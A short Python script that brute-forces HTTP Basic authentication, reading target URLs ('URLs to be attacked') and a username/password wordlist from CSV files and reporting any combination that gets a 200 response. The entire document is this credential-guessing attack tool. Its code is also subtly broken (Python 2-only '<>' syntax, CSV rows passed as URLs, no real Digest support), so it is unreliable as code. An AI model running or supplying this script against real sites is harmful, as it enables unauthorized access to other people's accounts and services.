import requests
import csv

with open('address.csv', 'r') as f:                     # reading URLs to be attacked
    address = list(csv.reader(f))

with open('wordlist.csv', 'r') as f:                    # reading dictionary
    wordlist = list(csv.reader(f))

for url in address:
    if requests.get(url).status_code <> 401:            # Send request without auth info - break if response is not 401
        print('The page %s is not using BasicAuth/DigestAuth, escaping...' % url)
        continue
    for usr, pwd in wordlist:
        # print('Trying %s/%s ...' % (usr, pwd))
        r = requests.get(url, auth=(usr, pwd))
        if r.status_code == 200:                        # break if 200 - OK
            print('Success! Address = %s, Combination is %s/%s' % (url, usr, pwd))
            break


